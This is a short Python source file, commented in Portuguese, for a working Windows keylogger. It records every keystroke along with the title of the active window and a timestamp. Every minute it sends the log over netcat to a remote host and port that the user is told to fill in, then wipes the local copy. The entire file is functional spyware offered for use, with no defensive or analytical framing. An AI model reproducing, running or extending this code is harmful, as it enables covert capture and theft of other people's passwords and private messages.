from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow
import datetime
import subprocess
import threading
import os

LAST_WINDOW = None
LOG_FILE = "log.txt"
NETCAT_HOST = "127.0.0.1"  # Altere para o IP remoto
NETCAT_PORT = 4444         # Altere para a porta remota
SEND_INTERVAL = 60         # Intervalo de envio em segundos


def enviar_via_netcat():
    """Função para enviar o log via Netcat."""
    if not os.path.exists(LOG_FILE):
        return

    with open(LOG_FILE, "r") as file:
        conteudo = file.read()

    if not conteudo.strip():
        return  # Não enviar se o arquivo estiver vazio

    try:
        # Usando subprocess para enviar os dados via Netcat
        process = subprocess.Popen(
            ["nc", NETCAT_HOST, str(NETCAT_PORT)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        process.communicate(input=conteudo.encode("utf-8"))
        print("[INFO] Log enviado com sucesso via Netcat!")

        # Limpar o arquivo de log após o envio
        open(LOG_FILE, "w").close()
    except Exception as e:
        print(f"[ERRO] Falha ao enviar via Netcat: {e}")


def agendar_envio():
    """Agenda o envio dos logs periodicamente."""
    enviar_via_netcat()
    threading.Timer(SEND_INTERVAL, agendar_envio).start()


def tecla_pressionada(tecla):
    global LAST_WINDOW
    with open(LOG_FILE, "a") as file:
        window = GetWindowText(GetForegroundWindow())
        if window != LAST_WINDOW:
            LAST_WINDOW = window
            file.write("\n #### {} - {}\n".format(window, datetime.datetime.now()))
        try:
            if tecla.vk >= 96 and tecla.vk <= 105:
                tecla = tecla.vk - 96
        except:
            pass

        tecla = str(tecla).replace("'", "")
        print(tecla)

        if len(tecla) > 1:
            tecla = " [{}] ".format(tecla)

        file.write(tecla)


# Iniciar envio programado de logs
agendar_envio()

# Iniciar o listener de teclado
with keyboard.Listener(on_press=tecla_pressionada) as listener:
    listener.join()
